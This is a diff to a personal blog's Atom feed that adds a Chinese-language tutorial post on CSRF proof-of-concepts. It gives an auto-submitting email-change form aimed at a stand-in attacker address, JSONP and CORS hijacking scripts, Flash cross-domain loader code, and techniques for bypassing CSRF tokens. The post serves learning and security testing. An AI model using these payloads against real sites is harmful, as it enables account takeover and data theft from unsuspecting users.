@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://zzggtt.github.io</id>
     <title>ZG0T01</title>
-    <updated>2020-03-14T02:38:17.196Z</updated>
+    <updated>2020-03-20T12:55:42.538Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://zzggtt.github.io"/>
     <link rel="self" href="https://zzggtt.github.io/atom.xml"/>
@@ -10,6 +10,133 @@
     <logo>https://zzggtt.github.io/images/avatar.png</logo>
     <icon>https://zzggtt.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, ZG0T01</rights>
+    <entry>
+        <title type="html"><![CDATA[CSRF POC]]></title>
+        <id>https://zzggtt.github.io/post/csrf-poc/</id>
+        <link href="https://zzggtt.github.io/post/csrf-poc/">
+        </link>
+        <updated>2020-03-20T12:54:56.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="csrf-poc">CSRF POC</h2>
+<h4 id="0x01-html-csrf">0x01 HTML CSRF</h4>
+<ul>
+<li>GET</li>
+</ul>
+<p>​	发起CSRF的请求都是从HTML元素发出的，for example：</p>
+<p>​	HTML中能够设置src/herf等链接地址的标签都可以发起一个<strong>GET请求</strong>：</p>
+<pre><code class="language-html">&lt;link href=&quot;&quot;&gt;
+&lt;img src=&quot;&quot;&gt;
+&lt;iframe src=&quot;&quot;&gt;
+&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0&quot;;url=&quot;&quot;&gt;
+&lt;script src=&quot;&quot;&gt;
+&lt;embed src=&quot;&quot;&gt;
+&lt;a href=&quot;&quot;&gt;
+.......
+还有通过JavaScript动态生成的标签对象或CSS对象发起的GET请求。
+</code></pre>
+<p>​	通常，攻击者会将恶意HTML置于他们控制的网站上，然后诱使受害者访问该网站。这可以通过电子邮件或社交	媒体消息向用户提供指向网站的链接来完成。或者，如果将攻击置于流行的网站中（例如，在用户评论中），	他们可能只是在等待用户访问该网站。</p>
+<ul>
+<li>
+<p>POST</p>
+<p>而发起<strong>POST请求</strong>的只能通过form表单，通常可以利用<strong>burp直接生成</strong>csrf poc，格式大致如下：</p>
+</li>
+</ul>
+<pre><code class="language-html">&lt;html&gt;
+&lt;body&gt;
+&lt;form action=&quot;https://example.com/email/change&quot; method=&quot;POST&quot;&gt;//设置action地址为目标地址
+ &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;pwned@evil-user.net&quot; /&gt;
+&lt;/form&gt;
+&lt;script&gt;
+ document.forms[0].submit(); //自动提交
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>​	构造完成，当用户被欺骗点击了该攻击页面时，一个跨域的伪造的POST请求表单请求就发出了。同样，该请求	带上了目标用户的cookie。</p>
+<h4 id="0x02-jsonp-hijacking">0x02 Jsonp Hijacking</h4>
+<p>​	Jsonp Hijacking的攻击过程是CSRF，只不过是对AJAX响应中JSON数据类型进行劫持。而JSONP 是一种无需考	虑跨域问题即可传送 JSON 数据的方法。</p>
+<p><strong>POC：</strong></p>
+<pre><code class="language-html">&lt;script&gt;
+function hijack(data){
+   alert(JSON.stringify(data));
+}
+&lt;/script&gt;
+&lt;script src=&quot;http://example/csrf/jsonp.php?callback=hijack&quot;&gt;&lt;/script&gt;
+</code></pre>
+<p>​	第一个<script>标签内的脚本是我们自定义的劫持函数hijack，第二个<script>标签实际上是通过src属性发	出了一个CSRF GET请求，加载远程的脚本资源。请求带上了用户的cookie身份认信息。由于hijack函数被预先	劫持而定义，并且第二个<script>标签内的远程脚本文件资源返回的数据被当做了JavaScript代码而被解析执	行，这时就会执行这个hijack函数。</p>
+<h4 id="0x03-cors-hijacking">0x03 CORS Hijacking</h4>
+<p>​	cors hijiacking是利用cors配置错误来进行数据劫持。而cors是跨域共享资源的一种机制。</p>
+<p><strong>poc：</strong></p>
+<script>
+    window.onload = function cors() {
+    var xhttp = new XMLHttpRequest();
+    xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+    document.getElementById("demo").innerHTML =
+    alert(this.responseText);
+    }
+    };
+    xhttp.open("GET", "http://127.0.0.1/DoraBox-master/csrf/userinfo.php", true);
+    xhttp.withCredentials = false;
+    xhttp.send();
+    }
+</script>
+<p>​	通过XMLHttpRequest对象的send方法发起请求，当readyState==4（即发出的HTTP请求响应已经完全接收时），触发onreadystatechange事件句柄。</p>
+<p>​</p>
+<h4 id="0x04-flash-csrf">0x04 Flash CSRF</h4>
+<p>如果目标网站的根目录下存在<strong>crossdomain.xml</strong>文件，配置如下：</p>
+<pre><code class="language-html">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;cross-domain-policy&gt;
+&lt;allow-access-from domain=&quot;*&quot; /&gt;  
+&lt;/cross-domain-policy&gt;
+</code></pre>
+<p>其中<allow-access-from domain="*" /> 表示允许任何域的Flash请求本域的资源。和cors类似都属于配置不当导致的漏洞。</p>
+<p><strong>poc：</strong></p>
+<pre><code class="language-html">import flash.net.*;
+var loader = new URLLoader(new URLRequest(&quot;http://xxx.com/xxx&quot;))
+loader.addEventListener(Event.COMPLETE,function(){
+loader.data
+});
+loader.load();
+</code></pre>
+<p>但是Adobe Flash 2017年7月25号，在官方博客上宣布到2020年底停止更新Flash，鼓励开发者尽早使用新的标准（ HTML5、WebGL 和 WebAssembly）进行开发。</p>
+<h2 id="csrf-bypass">CSRF Bypass</h2>
+<h4 id="0x01-referer">0x01 Referer</h4>
+<p>Referer：</p>
+<blockquote>
+<p>HTTP Referer标头（在HTTP规范中无意中拼写错误）是一个可选的请求标头，其中包含链接到所请求资源的网页的URL。通常，当用户触发HTTP请求时，浏览器会自动添加它，包括单击链接或提交表单。存在多种方法，允许链接页面保留或修改Referer标头的值。通常出于隐私原因这样做。</p>
+</blockquote>
+<p>referer bypass参考key师傅的博客：https://gh0st.cn/archives/2018-08-01/1</p>
+<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1584708931671.png" alt="" loading="lazy"></figure>
+<h4 id="csrf-token">CSRF token</h4>
+<p>下面是参考的一段如何验证CSRF令牌的方法：</p>
+<blockquote>
+<p>生成CSRF令牌后，应将其存储在服务器端的用户会话数据中。当收到需要验证的后续请求时，服务器端应用程序应验证该请求是否包含与用户会话中存储的值匹配的令牌。无论<strong>请求</strong>的HTTP方法或内容<strong>类型</strong>如何，都必须执行此验证。如果请求根本<strong>不包含任何令牌</strong>，则应以与存在无效令牌时相同的方式拒绝该请求。</p>
+</blockquote>
+<p>所以下面是常见的一些bypass思路：</p>
+<ul>
+<li>
+<p>修改请求头</p>
+<blockquote>
+<p>当请求使用POST方法时，某些应用程序正确地验证了令牌，但是当使用GET方法时，跳过了验证。在这种情况下，攻击者可以切换到GET方法来绕过验证并发送CSRF攻击。</p>
+</blockquote>
+</li>
+<li>
+<p>删除包含token的整个参数</p>
+<blockquote>
+<p>如果令牌存在，某些应用程序会正确验证令牌，但是如果省略令牌，则跳过验证。</p>
+<p>在这种情况下，攻击者可以删除包含令牌的整个参数（而不仅仅是令牌的值），以绕过验证并进行CSRF攻击。</p>
+</blockquote>
+</li>
+<li>
+<p>替换token</p>
+<blockquote>
+<p>某些应用程序无法验证令牌与发出请求的用户属于同一会话。而是，应用程序维护它已发出的全局令牌池，并接受出现在该池中的所有令牌。</p>
+<p>在这种情况下，攻击者可以使用自己的帐户登录到应用程序，获取有效令牌，然后在其CSRF攻击中将该令牌提供给受害用户。</p>
+</blockquote>
+</li>
+</ul>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[How to prevent xss attacks]]></title>
         <id>https://zzggtt.github.io/post/how-to-prevent-xss-attacks/</id>
